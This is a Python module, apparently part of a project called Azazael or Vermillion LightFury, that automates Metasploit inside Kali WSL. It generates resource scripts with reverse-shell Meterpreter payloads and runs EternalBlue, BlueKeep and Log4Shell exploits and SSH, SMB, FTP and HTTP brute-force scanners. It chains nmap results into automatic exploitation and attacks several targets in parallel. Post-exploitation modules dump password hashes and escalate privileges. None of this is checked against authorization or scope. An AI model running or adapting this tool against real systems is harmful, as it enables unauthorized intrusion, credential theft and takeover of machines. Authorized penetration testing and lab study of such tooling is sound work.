# coding: utf-8
"""
MetasploitBridge — Kali Metasploit Integration Worm for Azazael
=================================================================
Wraps 'wsl -d kali msfconsole' for automated exploit execution with
CheckpointWorm-compatible state rollback and full PAMS audit trail.

Features:
- WSL subprocess dispatch: runs msfconsole resource scripts inside Kali WSL
- Resource script generation: builds .rc files for automated exploit execution
- Session management: track active Meterpreter/shell sessions
- Checkpoint integration: pre-exploit snapshot for rollback compatibility
- PAMS audit: every exploit attempt recorded with full trace
- Payload type detection: windows, linux, multi-platform routing
- Post-exploit module support: hashdump, getsystem, migrate, persistence

Usage:
    >>> from worms.metasploit_bridge import MetasploitBridge
    >>> mb = MetasploitBridge()
    >>> result = mb.exploit("exploit/windows/smb/ms17_010_eternalblue", rhosts="10.0.0.5")
    >>> print(result.status)  # 'exploited' | 'failed' | 'error'

Registry:
    @register_worm(category="security", priority=9, cooldown_seconds=120.0,
                   description="Kali Metasploit bridge — automated exploit execution with checkpoint rollback")
"""

import sys
import os
import json
import time
import shutil
import hashlib
import subprocess
from datetime import datetime, timezone
import uuid  # Phase 11.5 — collision-free session_id suffix under 3.14t barrier race
from pathlib import Path
from typing import Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Paths ───────────────────────────────────────────────────────────────────
_AZAZAEL_SRC = str(Path(__file__).resolve().parent.parent.parent / "azazael" / "src")
if _AZAZAEL_SRC not in sys.path:
    sys.path.insert(0, _AZAZAEL_SRC)

# Cross-platform shared directory (Kali WSL mounts C: at /mnt/c/)
from worms.exceptions import _IS_WINDOWS
_SHARED_DIR = "C:\\azazael_shared" if _IS_WINDOWS else "/mnt/c/azazael_shared"
_WSL_SHARED = "/mnt/c/azazael_shared"
_WSL_SCRIPT_DIR = f"{_WSL_SHARED}/metasploit_logs"

# ── Worm Registry ───────────────────────────────────────────────────────────
try:
    from CORE.worm_registry import register_worm, BaseWormMixin
    _REGISTRY = True
except ImportError:
    _REGISTRY = False
    class BaseWormMixin:
        VERSION = "0.0.0"
    def register_worm(category='', priority=0, cooldown_seconds=0.0, description='', tags=None):
        return lambda cls: cls

# Local-thread mixin (lock allocator; listed BEFORE BaseWormMixin in class MRO).
from worms.mixins import ThreadSafeWormMixin  # noqa: F401

# ── Shared Exceptions ───────────────────────────────────────────────────────
from worms.exceptions import KaliUnresponsiveError

# ── PAMS ────────────────────────────────────────────────────────────────────
try:
    from CORE.PamsRecorder import PamsRecorder
    _pams = PamsRecorder()
except ImportError:
    _pams = None

# ── CheckpointWorm ──────────────────────────────────────────────────────────
try:
    from CORE.WORMS.expansion.backup import CheckpointWorm
    _checkpoint_worm = CheckpointWorm()
except ImportError:
    _checkpoint_worm = None


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ExploitResult:
    """Result of a single Metasploit exploit attempt."""
    exploit_module: str
    target: str
    status: str          # exploited / failed / error / timeout
    session_id: str = ""
    session_type: str = ""  # meterpreter / shell
    payload: str = ""
    output: str = ""
    error: str = ""
    duration_seconds: float = 0.0
    checkpoint_taken: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "exploit": self.exploit_module, "target": self.target,
            "status": self.status, "session_id": self.session_id,
            "session_type": self.session_type, "payload": self.payload,
            "duration_sec": round(self.duration_seconds, 2),
            "checkpoint": self.checkpoint_taken,
        }

    @property
    def success(self) -> bool:
        return self.status == "exploited"


@dataclass
class PostModuleResult:
    """Result of a post-exploitation module."""
    module_name: str
    session_id: str
    status: str
    output: str = ""
    duration_seconds: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "module": self.module_name, "session": self.session_id,
            "status": self.status,
            "duration_sec": round(self.duration_seconds, 2),
        }


@dataclass
class SessionInfo:
    """Active Metasploit session."""
    session_id: str
    session_type: str      # meterpreter / shell
    target: str
    exploit_used: str
    info: str = ""
    opened_at: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.session_id, "type": self.session_type,
            "target": self.target, "exploit": self.exploit_used,
            "info": self.info,
        }


# ── MetasploitBridge Worm ───────────────────────────────────────────────────


@register_worm(
    category="security",
    priority=9,
    cooldown_seconds=120.0,
    description="Kali Metasploit bridge — automated exploit execution with checkpoint rollback and PAMS audit",
)
class MetasploitBridge(ThreadSafeWormMixin, BaseWormMixin):
    """Worm that executes Metasploit exploits inside Kali WSL from Windows Azazael.

    Integrates with:
    - CheckpointWorm (pre-exploit state snapshots for rollback)
    - PamsRecorder (complete audit trail of every exploit attempt)
    - NmapScanner (scan → exploit pipeline)
    - Shared directory (resource scripts and session logs)
    """

    VERSION = "1.0.0"
    __summary_method__ = "get_summary"

    # Common exploit modules for quick reference
    COMMON_EXPLOITS = {
        "eternalblue": "exploit/windows/smb/ms17_010_eternalblue",
        "bluekeep": "exploit/windows/rdp/cve_2019_0708_bluekeep",
        "log4shell": "exploit/multi/http/log4shell_log4j_2",
        "ssh_brute": "auxiliary/scanner/ssh/ssh_login",
        "smb_login": "auxiliary/scanner/smb/smb_login",
        "ftp_login": "auxiliary/scanner/ftp/ftp_login",
        "http_login": "auxiliary/scanner/http/http_login",
        "post_hashdump": "post/windows/gather/hashdump",
        "post_getsystem": "post/windows/escalate/getsystem",
        "post_migrate": "post/windows/manage/migrate",
    }

    # Common payloads
    PAYLOADS = {
        "windows_reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
        "windows_reverse_https": "windows/x64/meterpreter/reverse_https",
        "linux_reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
        "python_reverse_tcp": "python/meterpreter/reverse_tcp",
        "cmd_unix_reverse": "cmd/unix/reverse_bash",
    }

    def __init__(self):
        super().__init__()  # initialise self._lock via ThreadSafeWormMixin (wraps _active_sessions, _results, and other shared mutable state)
        self._pams = _pams
        self._checkpoint_worm = _checkpoint_worm
        # Phase 11.5 — µs+uuid8 hex for collision-free 3.14t barrier-sync ids.
        # Format: YYYYMMDD_HHMMSS_ffffff_<8-hex> (31 chars; uuid suffix defeats
        # clock_gettime-micros-tick collisions under free-threaded race).
        self._session_id = f"{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_%f')}_{uuid.uuid4().hex[:8]}"
        # Phase 12.1 — len==31 regression guard. See init in nmap_scanner for rationale.
        assert len(self._session_id) == 31, (
            f"_session_id {self._session_id!r} is not 31 chars "
            f"(format regressed — see MILESTONE Phase 11.5 v2 / Phase 12.1)"
        )
        self._exploits_run: int = 0
        self._sessions_established: int = 0
        self._active_sessions: dict[str, SessionInfo] = {}
        self._results: list[ExploitResult] = []
        self._last_checkpoint_checksum: str = ""
        self._checkpoint_count: int = 0
        self._fallback_checkpoint: dict[str, Any] | None = None
        self._pre_exploit_manifests: dict[str, dict[str, str]] = {}  # target → file→hash

    def _wsl_exec(self, command, timeout_sec: int = 300) -> tuple[int, str, str]:
        """Execute a command on Kali. Direct when running natively, WSL wrapper from Windows.

        Accepts either a string (wrapped in bash -c) or a list of args.
        This dual-signature ensures compatibility with shared utilities like
        verify_kali_responsive() that pass strings.
        """
        from worms.exceptions import _IS_KALI_NATIVE
        # Normalize: string → ["bash", "-c", string], list → as-is
        cmd_args = ["bash", "-c", command] if isinstance(command, str) else list(command)
        try:
            if _IS_KALI_NATIVE:
                # Running ON Kali — direct subprocess, no WSL wrapper needed
                result = subprocess.run(
                    cmd_args, capture_output=True, text=True,
                    timeout=timeout_sec,
                )
            else:
                wsl_cmd = ["wsl.exe", "-d", "kali", "--"] + cmd_args
                result = subprocess.run(
                    wsl_cmd, capture_output=True, text=True,
                    timeout=timeout_sec,
                )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return (-1, "", f"TIMEOUT after {timeout_sec}s")
        except FileNotFoundError:
            return (-2, "", "WSL not found")
        except Exception as e:
            return (-3, "", str(e))

    def _verify_kali_responsive(self):
        """Verify Kali WSL is reachable. Attempts auto-recovery if not.

        Delegates to shared verify_kali_responsive() in config.shared_dir.
        """
        from config.shared_dir import verify_kali_responsive
        verify_kali_responsive(
            wsl_exec_fn=self._wsl_exec,
            record_pams_fn=self._record_pams,
            event_prefix="metasploit_bridge",
        )

    def cleanup_old_scripts(self, max_age_hours: int = 24):
        """Delete .rc resource scripts older than max_age_hours from shared dir.

        Delegates to shared purge_stale_rc_scripts() in config.shared_dir.
        Called at the start of every exploit() to prevent unbounded accumulation.
        """
        try:
            from config.shared_dir import purge_stale_rc_scripts
            deleted = purge_stale_rc_scripts(
                log_dir=os.path.join(_SHARED_DIR, "metasploit_logs"),
                max_age_hours=max_age_hours,
                throttle_seconds=0,  # No throttle — always run at exploit start
            )
            if deleted > 0:
                self._record_pams("rc_cleanup", {"deleted": deleted, "max_age_hours": max_age_hours})
        except Exception:
            pass  # Never block exploit execution on cleanup failure

    def _record_pams(self, event_type: str, data: dict[str, Any], severity: str = "info"):
        """Record to PAMS memory."""
        if self._pams:
            try:
                self._pams.record_event(
                    f"metasploit_bridge.{event_type}", data,
                    source="MetasploitBridge", severity=severity,
                )
            except Exception:
                pass

    def _build_resource_script(
        self,
        exploit_module: str,
        rhosts: str,
        lhost: str,
        payload: str = "",
        extra_opts: dict[str, str] | None = None,
        post_modules: list[str] | None = None,
        rport: int = 0,
        lport: int = 4444,
    ) -> str:
        """Build a Metasploit .rc resource script for automated execution.

        Returns the script content as a string.
        """
        payload = payload or "windows/x64/meterpreter/reverse_tcp"

        lines = [
            f"# Metasploit Resource Script — Vermillion LightFury",
            f"# Generated: {datetime.now().isoformat()}",
            f"# Module: {exploit_module}",
            f"# Target: {rhosts}",
            f"",
            f"use {exploit_module}",
            f"set RHOSTS {rhosts}",
        ]

        if rport > 0:
            lines.append(f"set RPORT {rport}")

        # Set payload
        if "exploit/" in exploit_module:
            lines.append(f"set PAYLOAD {payload}")
            lines.append(f"set LHOST {lhost}")
            lines.append(f"set LPORT {lport}")

        # Extra options
        if extra_opts:
            for k, v in extra_opts.items():
                lines.append(f"set {k} {v}")

        # Run exploit
        lines.append("")
        lines.append("exploit -j")  # Run as job for non-blocking
        lines.append("sleep 5")

        # Post-exploit modules
        if post_modules:
            lines.append("")
            lines.append("# Post-exploitation")
            for post_mod in post_modules:
                lines.append(f"use {post_mod}")
                lines.append(f"set SESSION 1")
                lines.append(f"run -j")
                lines.append("sleep 2")

        # Show sessions
        lines.append("")
        lines.append("sessions -l")
        lines.append("")

        return "\n".join(lines)

    def _save_resource_script(self, script: str, name: str = "") -> str:
        """Save a resource script to the shared directory.

        Returns the WSL path to the script.
        """
        ts = int(time.time())
        filename = f"msf_{name or 'exploit'}_{self._session_id}_{ts}.rc"
        win_path = os.path.join(_SHARED_DIR, "metasploit_logs", filename)
        # wsl_path is consumed by a WSL bash subprocess, which always wants forward-slashes regardless of host OS — using os.path.join here would emit backslashes on Windows host, which WSL reads as literal filename chars (not separators). Forward-slash f-string keeps it safe on both hosts.
        wsl_path = f"{_WSL_SCRIPT_DIR}/{filename}"

        os.makedirs(os.path.dirname(win_path), exist_ok=True)
        with open(win_path, "w", encoding="utf-8") as f:
            f.write(script)

        return wsl_path

    # ── Exploit Execution ──────────────────────────────────────────────────

    def exploit(
        self,
        exploit_module: str,
        rhosts: str,
        lhost: str = "127.0.0.1",
        payload: str = "",
        rport: int = 0,
        lport: int = 4444,
        extra_opts: dict[str, str] | None = None,
        post_modules: list[str] | None = None,
        checkpoint: bool = True,
        timeout_sec: int = 300,
    ) -> ExploitResult:
        """Execute a Metasploit exploit via Kali WSL.

        Args:
            exploit_module: Full path like 'exploit/windows/smb/ms17_010_eternalblue'
            rhosts: Target IP(s)
            lhost: Local host for reverse connections
            payload: Meterpreter payload (auto-selected if empty)
            rport: Remote port (auto if 0)
            lport: Local port for reverse connection
            extra_opts: Additional msf options (SMBUser, SMBPass, etc.)
            post_modules: Post-exploit modules to run after exploitation
            checkpoint: Take CheckpointWorm snapshot before exploit
            timeout_sec: Timeout

        Returns:
            ExploitResult with status and session info

        Raises:
            KaliUnresponsiveError: if Kali is down and auto-recovery fails
            RuntimeError: if E: drive critically low (circuit breaker)
        """
        # ── Pre-flight gates ──
        self.cleanup_old_scripts()
        self._verify_kali_responsive()

        from worms.kali_health import KaliHealth
        ok, reason = KaliHealth.preflight_check()
        if not ok:
            raise RuntimeError(f"Circuit breaker: {reason}")
        elif "low" in reason.lower():
            self._record_pams("low_space_warning", {"reason": reason}, severity="warning")

        start_time = datetime.now()
        checkpoint_taken = False

        # Resolve alias
        if exploit_module in self.COMMON_EXPLOITS:
            exploit_module = self.COMMON_EXPLOITS[exploit_module]

        # Checkpoint: save state via CheckpointWorm (in-memory, zero disk cost)
        if checkpoint and self._checkpoint_worm:
            checkpoint_taken = True
            try:
                state = self._capture_state()
                checksum = self._checkpoint_worm.save_checkpoint("metasploit_bridge", state)
                self._last_checkpoint_checksum = checksum
                self._checkpoint_count += 1
                # Lightweight pre-exploit filesystem manifest (key Kali paths only)
                self._pre_exploit_manifests[rhosts] = self._capture_fs_manifest()
                self._record_pams("checkpoint_saved", {
                    "exploit": exploit_module, "target": rhosts,
                    "checksum": checksum, "checkpoint_count": self._checkpoint_count,
                })
            except Exception as e:
                self._record_pams("checkpoint_failed", {
                    "exploit": exploit_module, "target": rhosts, "error": str(e),
                }, severity="warning")
        elif checkpoint:
            # CheckpointWorm unavailable — capture state locally as fallback
            checkpoint_taken = True
            try:
                self._fallback_checkpoint = self._capture_state()
                self._last_checkpoint_checksum = hashlib.sha256(
                    json.dumps(self._fallback_checkpoint, sort_keys=True, default=str).encode()
                ).hexdigest()[:12]
                self._checkpoint_count += 1
                self._record_pams("checkpoint_saved_fallback", {
                    "exploit": exploit_module, "target": rhosts,
                    "checksum": self._last_checkpoint_checksum,
                    "warning": "CheckpointWorm not available, using local fallback",
                })
            except Exception as e:
                self._record_pams("checkpoint_failed", {
                    "exploit": exploit_module, "target": rhosts, "error": str(e),
                }, severity="warning")

        # Build and save resource script
        script = self._build_resource_script(
            exploit_module=exploit_module,
            rhosts=rhosts,
            lhost=lhost,
            payload=payload,
            rport=rport,
            lport=lport,
            extra_opts=extra_opts,
            post_modules=post_modules,
        )
        script_path = self._save_resource_script(script, exploit_module.replace("/", "_"))

        self._record_pams("exploit_started", {
            "module": exploit_module, "target": rhosts,
            "payload": payload, "checkpoint": checkpoint_taken,
        })

        # Execute via msfconsole
        rc, stdout, stderr = self._wsl_exec(
            ["msfconsole", "-q", "-r", script_path],
            timeout_sec=timeout_sec,
        )

        duration = (datetime.now() - start_time).total_seconds()

        # Parse results
        status = "failed"
        session_id = ""
        session_type = ""

        if "Meterpreter session" in stdout or "Command shell session" in stdout:
            status = "exploited"
            self._sessions_established += 1

            # Extract session details
            for line in stdout.splitlines():
                if "meterpreter" in line.lower() and "session" in line.lower():
                    session_type = "meterpreter"
                    parts = line.split()
                    for p in parts:
                        if p.isdigit():
                            session_id = p
                            break
                elif "shell" in line.lower() and "session" in line.lower():
                    session_type = "shell"
                    parts = line.split()
                    for p in parts:
                        if p.isdigit():
                            session_id = p
                            break

            # Track session
            if session_id:
                with self._lock:
                    self._active_sessions[session_id] = SessionInfo(
                        session_id=session_id,
                        session_type=session_type,
                        target=rhosts,
                        exploit_used=exploit_module,
                        info=stdout[:200],
                        opened_at=datetime.now().isoformat(),
                    )

        elif "Exploit failed" in stdout or "No sessions" in stdout:
            status = "failed"
        elif "Timeout" in stderr or rc == -1:
            status = "timeout"
        elif rc != 0:
            status = "error"

        result = ExploitResult(
            exploit_module=exploit_module,
            target=rhosts,
            status=status,
            session_id=session_id,
            session_type=session_type,
            payload=payload,
            output=stdout[:5000],
            error=stderr[:2000],
            duration_seconds=duration,
            checkpoint_taken=checkpoint_taken,
        )

        with self._lock:
            self._exploits_run += 1
            self._results.append(result)

        self._record_pams(
            "exploit_completed",
            result.to_dict(),
            severity="info" if result.success else "warning",
        )

        return result

    def exploit_multi(
        self,
        targets: list[str],
        exploit_module: str,
        lhost: str = "127.0.0.1",
        max_workers: int = 3,
        **kwargs,
    ) -> dict[str, ExploitResult]:
        """Exploit multiple targets in parallel.

        Args:
            targets: List of target IPs
            exploit_module: Exploit to use on all targets
            lhost: Local host for reverse connections
            max_workers: Max concurrent exploit attempts
            **kwargs: Passed to exploit()

        Returns:
            Dict mapping target -> ExploitResult
        """
        results: dict[str, ExploitResult] = {}

        self._record_pams("multi_exploit_started", {
            "targets": len(targets), "module": exploit_module,
        })

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {}
            for i, target in enumerate(targets):
                # Stagger LPORTs to avoid conflicts
                lport = kwargs.get("lport", 4444) + i
                futures[pool.submit(
                    self.exploit, exploit_module, target,
                    lhost=lhost, lport=lport, **{k: v for k, v in kwargs.items() if k != "lport"},
                )] = target

            for future in as_completed(futures):
                target = futures[future]
                try:
                    results[target] = future.result(timeout=600)
                except Exception as e:
                    results[target] = ExploitResult(
                        exploit_module=exploit_module, target=target,
                        status="error", error=str(e),
                    )

        self._record_pams("multi_exploit_completed", {
            "total": len(targets), "exploited": sum(1 for r in results.values() if r.success),
        })

        return results

    # ── Session Management ─────────────────────────────────────────────────

    def list_sessions(self) -> list[SessionInfo]:
        """List active Metasploit sessions."""
        rc, stdout, _ = self._wsl_exec(
            ["msfconsole", "-q", "-x", "sessions -l; exit"],
            timeout_sec=30,
        )
        sessions: list[SessionInfo] = []

        for line in stdout.splitlines():
            if line.strip() and not line.startswith("Active") and not line.startswith("--"):
                parts = line.split()
                if len(parts) >= 4 and parts[0].isdigit():
                    sessions.append(SessionInfo(
                        session_id=parts[0],
                        session_type="meterpreter" if "meterpreter" in line.lower() else "shell",
                        target=parts[2] if len(parts) > 2 else "",
                        exploit_used="",
                        info=line,
                    ))

        return sessions

    def run_post_module(
        self,
        session_id: str,
        post_module: str,
        timeout_sec: int = 120,
    ) -> PostModuleResult:
        """Run a post-exploitation module on an active session.

        Args:
            session_id: Active session ID
            post_module: Full module path or alias from COMMON_EXPLOITS
            timeout_sec: Timeout

        Returns:
            PostModuleResult
        """
        if post_module in self.COMMON_EXPLOITS:
            post_module = self.COMMON_EXPLOITS[post_module]

        start = time.time()
        script = (
            f"use {post_module}\n"
            f"set SESSION {session_id}\n"
            f"run\n"
            f"exit\n"
        )
        script_path = self._save_resource_script(script, f"post_{post_module.replace('/', '_')}")

        rc, stdout, stderr = self._wsl_exec(
            ["msfconsole", "-q", "-r", script_path],
            timeout_sec=timeout_sec,
        )
        duration = time.time() - start

        status = "completed" if rc == 0 and "failed" not in stdout.lower() else "failed"

        result = PostModuleResult(
            module_name=post_module, session_id=session_id,
            status=status, output=stdout, duration_seconds=duration,
        )

        self._record_pams("post_module", result.to_dict())
        return result

    # ── Quick Scan → Exploit Pipeline ──────────────────────────────────────

    def scan_and_exploit(
        self,
        target: str,
        scan_type: str = "quick",
        auto_exploit: bool = True,
    ) -> dict[str, Any]:
        """Run NmapScanner, then exploit any vulnerable ports found.

        Returns combined scan + exploit report.
        """
        from worms.nmap_scanner import NmapScanner

        ns = NmapScanner()
        scan_result = ns.scan(target, scan_type=scan_type)
        open_ports = []
        for host in scan_result.hosts:
            for port in host.ports:
                if port.state == "open":
                    open_ports.append({
                        "host": host.ip, "port": port.port,
                        "service": port.service, "version": port.version,
                    })

        exploits_run: list[dict[str, Any]] = []
        if auto_exploit and open_ports:
            port_exploit_map = {
                445: "exploit/windows/smb/ms17_010_eternalblue",
                3389: "exploit/windows/rdp/cve_2019_0708_bluekeep",
                22: "auxiliary/scanner/ssh/ssh_login",
                21: "auxiliary/scanner/ftp/ftp_login",
                80: "auxiliary/scanner/http/http_login",
                8080: "auxiliary/scanner/http/http_login",
                443: "auxiliary/scanner/http/http_login",
            }
            for p in open_ports[:3]:  # Limit to 3
                exploit_mod = port_exploit_map.get(p["port"])
                if exploit_mod:
                    result = self.exploit(exploit_mod, p["host"], checkpoint=True)
                    exploits_run.append(result.to_dict())

        return {
            "target": target,
            "scan": scan_result.summary(),
            "open_ports": open_ports,
            "exploits_run": exploits_run,
            "sessions_established": self._sessions_established,
        }

    # ── Checkpoint / Rollback ───────────────────────────────────────────────

    def _capture_state(self) -> dict[str, Any]:
        """Capture full MetasploitBridge execution state for checkpointing.

        Lightweight — in-memory dict, zero disk cost. Captures:
        - Active sessions, exploit history, counters
        - No large binary data (outputs truncated to 2KB each)
        Thread-safe: holds _lock during session dict iteration.
        """
        with self._lock:
            return {
                "session_id": self._session_id,
                "exploits_run": self._exploits_run,
                "sessions_established": self._sessions_established,
                "active_sessions": {
                    sid: s.to_dict()
                    for sid, s in self._active_sessions.items()
                },
                "results": [
                    r.to_dict() for r in self._results[-20:]  # last 20 only
                ],
                "checkpoint_count": self._checkpoint_count,
                "captured_at": datetime.now().isoformat(),
            }

    def _restore_state(self, state: dict[str, Any]) -> bool:
        """Restore MetasploitBridge state from a checkpoint dict. Thread-safe."""
        try:
            with self._lock:
                self._exploits_run = state.get("exploits_run", self._exploits_run)
                self._sessions_established = state.get("sessions_established", self._sessions_established)
                self._active_sessions = {
                    sid: SessionInfo(**s)
                    for sid, s in state.get("active_sessions", {}).items()
                }
                self._checkpoint_count = state.get("checkpoint_count", self._checkpoint_count)
            return True
        except Exception:
            return False

    def rollback(self) -> dict[str, Any]:
        """Roll back to last checkpoint via CheckpointWorm (or local fallback).

        Restores MetasploitBridge's tracking state (sessions, counters,
        exploit history). Does NOT affect active Metasploit sessions on
        the target — those remain live.

        Returns:
            Dict with rollback status, restored checksum, and state diff.
            Thread-safe.
        """
        if not self._last_checkpoint_checksum:
            return {
                "success": False,
                "error": "No checkpoint taken yet — run exploit(checkpoint=True) first",
            }

        with self._lock:
            pre_state = {
                "exploits_run": self._exploits_run,
                "sessions_established": self._sessions_established,
                "active_session_count": len(self._active_sessions),
            }

        # Try CheckpointWorm first, fall back to local snapshot
        restored = None
        source = "none"

        if self._checkpoint_worm:
            restored = self._checkpoint_worm.restore_checkpoint("metasploit_bridge")
            if restored is not None:
                source = "CheckpointWorm"

        if restored is None and self._fallback_checkpoint is not None:
            restored = self._fallback_checkpoint
            source = "local_fallback"

        if restored is None:
            return {
                "success": False,
                "error": "Checkpoint not found — may have been evicted or never taken",
            }

        ok = self._restore_state(restored)

        with self._lock:
            post_state = {
                "exploits_run": self._exploits_run,
                "sessions_established": self._sessions_established,
                "active_session_count": len(self._active_sessions),
            }

        self._record_pams("rollback_executed", {
            "checksum": self._last_checkpoint_checksum,
            "source": source,
            "restored": ok,
            "pre_state": pre_state,
            "post_state": post_state,
        })

        return {
            "success": ok,
            "source": source,
            "checksum": self._last_checkpoint_checksum,
            "pre_state": pre_state,
            "post_state": post_state,
        }

    def _capture_fs_manifest(self) -> dict[str, str]:
        """Capture a lightweight filesystem manifest of key Kali paths.

        Only hashes critical directories that exploits might modify:
        /tmp, /root, /var/log. Uses sha256 for integrity.
        Excludes large binaries — only file paths and hashes, ~2-5 KB total.
        Adds ~1-3s per checkpoint from WSL sha256sum overhead (up to 90 files).

        Uses single-line-per-file output with sentinel to survive
        unreadable files without corrupting the parse.
        """
        key_paths = ["/tmp", "/root", "/var/log"]
        manifest: dict[str, str] = {}
        # Robust format: one line per file as "<path>|<hash or FAILED>"
        cmd = (
            "find /tmp /root /var/log -type f -maxdepth 3 2>/dev/null | head -90 | "
            "while IFS= read -r f; do "
            "h=$(sha256sum \"$f\" 2>/dev/null | cut -d' ' -f1); "
            "echo \"$f|${h:-FAILED}\"; "
            "done"
        )
        rc, stdout, _ = self._wsl_exec(
            ["bash", "-c", cmd],
            timeout_sec=15,
        )
        if rc == 0:
            for line in stdout.strip().splitlines():
                if "|" in line:
                    parts = line.split("|", 1)
                    if len(parts) == 2 and parts[1] != "FAILED":
                        manifest[parts[0]] = parts[1]
        return manifest

    def diff_after_exploit(self, target: str) -> dict[str, Any]:
        """Diff filesystem state before vs after exploit for a target.

        Returns files added, modified, and deleted during the exploit.
        Lightweight — only compares hashes of ~90 files max.
        """
        pre = self._pre_exploit_manifests.get(target)
        if not pre:
            return {"error": "No pre-exploit manifest for this target"}

        post = self._capture_fs_manifest()
        pre_keys = set(pre.keys())
        post_keys = set(post.keys())

        added = list(post_keys - pre_keys)
        deleted = list(pre_keys - post_keys)
        modified = [
            k for k in (pre_keys & post_keys)
            if k in post and pre.get(k) != post.get(k)
        ]

        result = {
            "target": target,
            "files_added": len(added),
            "files_modified": len(modified),
            "files_deleted": len(deleted),
            "added": added[:20],
            "modified": modified[:20],
            "deleted": deleted[:20],
        }
        self._record_pams("fs_diff", result)
        return result

    # ── Summary ────────────────────────────────────────────────────────────

    def get_summary(self) -> dict[str, Any]:
        return {
            "version": self.VERSION,
            "project": "Vermillion LightFury",
            "session_id": self._session_id,
            "exploits_run": self._exploits_run,
            "sessions_established": self._sessions_established,
            "active_sessions": len(self._active_sessions),
            "checkpoints_taken": self._checkpoint_count,
            "last_checkpoint": self._last_checkpoint_checksum[:12] if self._last_checkpoint_checksum else "none",
            "checkpoint_worm_available": self._checkpoint_worm is not None,
            "common_exploits": list(self.COMMON_EXPLOITS.keys()),
            "pams_connected": self._pams is not None,
        }

    def execute(self) -> dict[str, Any]:
        return {
            "success": True,
            "method": "get_summary",
            "result": self.get_summary(),
        }


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="MetasploitBridge — Kali Metasploit Integration (Vermillion LightFury)",
    )
    # Phase 13.7: required=True propagates argparse errors as exit-2;
    # no-args UX is preserved by the len(sys.argv)==1 fallback below.
    sub = parser.add_subparsers(dest="command", required=True, help="Command")

    exploit_p = sub.add_parser("exploit", help="Run an exploit")
    exploit_p.add_argument("module", help="Exploit module path or alias")
    exploit_p.add_argument("target", help="Target IP(s)")
    exploit_p.add_argument("--lhost", default="127.0.0.1", help="Local host for reverse")
    exploit_p.add_argument("--lport", type=int, default=4444, help="Local port")
    exploit_p.add_argument("--rport", type=int, default=0, help="Remote port")
    exploit_p.add_argument("--payload", default="", help="Payload")
    exploit_p.add_argument("--no-checkpoint", action="store_true", help="Skip checkpoint")

    sess_p = sub.add_parser("sessions", help="List active sessions")

    post_p = sub.add_parser("post", help="Run post-exploit module")
    post_p.add_argument("session", help="Session ID")
    post_p.add_argument("module", help="Post module path or alias")

    pipe_p = sub.add_parser("scan-exploit", help="Scan then exploit")
    pipe_p.add_argument("target", help="Target IP")

    sub.add_parser("exploits", help="List common exploit aliases")
    sub.add_parser("checkpoint", help="Show checkpoint status")

    rollback_p = sub.add_parser("rollback", help="Roll back to last checkpoint")

    # Phase 13.7: no-args UX fallback. MetasploitBridge summary path.
    if len(sys.argv) == 1:
        mb = MetasploitBridge()
        s = mb.get_summary()
        print(f"MetasploitBridge v{MetasploitBridge.VERSION} — Vermillion LightFury")
        print(f"  Exploits run: {s['exploits_run']}")
        print(f"  Sessions: {s['sessions_established']} established, {s['active_sessions']} active")
        print(f"  Aliases: {len(s['common_exploits'])} common exploits")
        print(f"  PAMS: {'connected' if s['pams_connected'] else 'unavailable'}")
        return

    args = parser.parse_args()
    mb = MetasploitBridge()

    if args.command == "exploit":
        result = mb.exploit(
            args.module, args.target,
            lhost=args.lhost, lport=args.lport, rport=args.rport,
            payload=args.payload, checkpoint=not args.no_checkpoint,
        )
        print(f"Exploit: {result.exploit_module}")
        print(f"Target:  {result.target}")
        print(f"Status:  {result.status.upper()}")
        if result.session_id:
            print(f"Session: {result.session_id} ({result.session_type})")
        print(f"Duration: {result.duration_seconds:.1f}s")
        if result.error:
            print(f"Error: {result.error[:200]}")

    elif args.command == "sessions":
        sessions = mb.list_sessions()
        if sessions:
            for s in sessions:
                print(f"  [{s.session_id}] {s.session_type} → {s.target}")
        else:
            print("No active sessions")

    elif args.command == "post":
        result = mb.run_post_module(args.session, args.module)
        print(f"Module: {result.module_name}")
        print(f"Status: {result.status} ({result.duration_seconds:.1f}s)")

    elif args.command == "scan-exploit":
        report = mb.scan_and_exploit(args.target)
        print(json.dumps(report, indent=2, default=str))

    elif args.command == "exploits":
        print("Common exploit aliases:")
        for alias, path in mb.COMMON_EXPLOITS.items():
            print(f"  {alias:<25} → {path}")

    elif args.command == "checkpoint":
        s = mb.get_summary()
        print(f"Checkpoints taken: {s['checkpoints_taken']}")
        print(f"Last checkpoint:  {s['last_checkpoint']}")
        print(f"CheckpointWorm:   {'available' if s['checkpoint_worm_available'] else 'unavailable (using local fallback)'}")
        print(f"PAMS:             {'connected' if s['pams_connected'] else 'unavailable'}")

    elif args.command == "rollback":
        result = mb.rollback()
        print(f"Rollback: {'SUCCESS' if result['success'] else 'FAILED'}")
        print(f"Source:   {result.get('source', 'N/A')}")
        if result['success']:
            pre = result['pre_state']
            post = result['post_state']
            print(f"Pre:  exploits={pre['exploits_run']}, sessions={pre['sessions_established']}, active={pre['active_session_count']}")
            print(f"Post: exploits={post['exploits_run']}, sessions={post['sessions_established']}, active={post['active_session_count']}")
        else:
            print(f"Error: {result.get('error', 'unknown')}")

    else:
        print(f"MetasploitBridge v{MetasploitBridge.VERSION} — Vermillion LightFury")
        s = mb.get_summary()
        print(f"  Exploits run: {s['exploits_run']}")
        print(f"  Sessions: {s['sessions_established']} established, {s['active_sessions']} active")
        print(f"  Aliases: {len(s['common_exploits'])} common exploits")
        print(f"  PAMS: {'connected' if s['pams_connected'] else 'unavailable'}")


if __name__ == "__main__":
    main()
